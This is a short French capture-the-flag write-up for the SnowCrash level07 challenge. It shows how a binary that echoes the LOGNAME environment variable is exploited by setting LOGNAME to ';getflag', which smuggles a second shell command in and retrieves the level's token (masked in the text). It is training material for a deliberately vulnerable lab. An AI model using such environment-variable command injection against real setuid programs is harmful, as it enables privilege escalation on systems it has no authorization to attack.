# Level07

Nous n'avons qu'un binaire de présent dans le home:

```bash
level07@SnowCrash:~$ ./level07 
level07
```

Regardons avec strings:
```
level07@SnowCrash:~$ strings level07 
...
getenv
...
LOGNAME
/bin/echo %s
...
```

Le programme semble utiliser une variable d'environnement 'LOGNAME', regardons avec 'env'

```bash
level07@SnowCrash:~$ env
...
LOGNAME=level07
...
```
Exactement ce que nous affiche le programme en sortie standard.

Essayons une injection basique:

```bash
level07@SnowCrash:~$ LOGNAME=";getflag" ./level07 

Check flag.Here is your token : XXXXXXXXXXXXXXXXXXXXXXXXX
```
